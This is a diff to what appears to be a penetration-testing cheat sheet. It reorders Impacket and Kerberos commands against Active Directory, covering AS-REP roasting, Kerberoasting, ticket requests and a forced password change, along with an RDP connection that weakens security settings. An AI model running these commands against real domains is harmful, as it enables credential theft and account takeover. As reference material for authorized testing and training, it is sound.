@@ -278,7 +278,7 @@ shares
 use
 
 [*] Kerberos
-MYKRB5="custom_krb5.conf";export KRB5_CONFIG="$PWD/$MYKRB5"; nano ./"$MYKRB5"
+KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5_FILE"
 [libdefaults]
     default_realm = $KRB5DOM
     dns_lookup_realm = true
@@ -296,17 +296,18 @@ MYKRB5="custom_krb5.conf";export KRB5_CONFIG="$PWD/$MYKRB5"; nano ./"$MYKRB5"
     .$DOM = $KRB5DOM
 
 impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET
-export KRB5CCNAME="$PWD/$USERNAME@SPN@$KRB5DOM.ccache"
-kinit -c "$PWD/$USERNAME@SPN@$KRB5DOM.ccache" '$USERNAME@$KRB5DOM'
+export KRB5CCNAME="$USERNAME.ccache"; chmod 0600 $KRB5CCNAME
+kinit -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'
 klist
 
+impacket-changepasswd $DC/'$USERNAME':'$PASSWORD'@$DOM -dc-ip $TARGET -newpass 'Password12345!'
 impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $DC
 impacket-GetADUsers $DOM/ -dc-host $DC -k -no-pass
-impacket-GetNPUsers -usersfile usernames $DOM/ -dc-ip "$TARGET"
-impacket-GetUserSPNs -request-user '$USERNAME' -dc-ip "$TARGET" $DOM/'$USERNAME':'$PASSWORD'
-impacket-GetUserSPNs -no-preauth '$USERNAME' -usersfile usernames -dc-host "$TARGET" $DOM/
-impacket-GetUserSPNs -request -dc-ip "$TARGET" $DOM/'$USERNAME':'$PASSWORD'
-impacket-changepasswd -dc-ip $TARGET $DC/'$USERNAME':'$PASSWORD'@$TARGET -newpass 'Password12345!'
+impacket-GetNPUsers $DOM/ -dc-ip "$TARGET" -usersfile usernames
+impacket-GetUserSPNs $DOM/'$USERNAME':'$PASSWORD' -dc-ip "$TARGET" -request-user '$USERNAME'
+impacket-GetUserSPNs $DOM/ -dc-host "$TARGET" -usersfile usernames -no-preauth '$USERNAME'
+impacket-GetUserSPNs $DOM/'$USERNAME':'$PASSWORD' -dc-ip "$TARGET" -request
+
 
 [*] RDP
 xfreerdp /v:'$TARGET' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard
